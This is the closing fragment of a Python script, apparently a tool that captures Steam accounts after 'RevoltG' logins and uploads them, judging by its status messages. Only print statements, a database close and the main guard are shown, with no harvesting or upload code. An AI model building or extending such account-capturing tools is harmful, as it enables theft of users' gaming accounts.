        print(f"\n{C.DIM}[*] No new Steam accounts to upload{C.RESET}")

    print(f"\n{C.DIM}    Run this script again after each new RevoltG login to capture more accounts.{C.RESET}\n")
    db_conn.close()


if __name__ == '__main__':
    main()
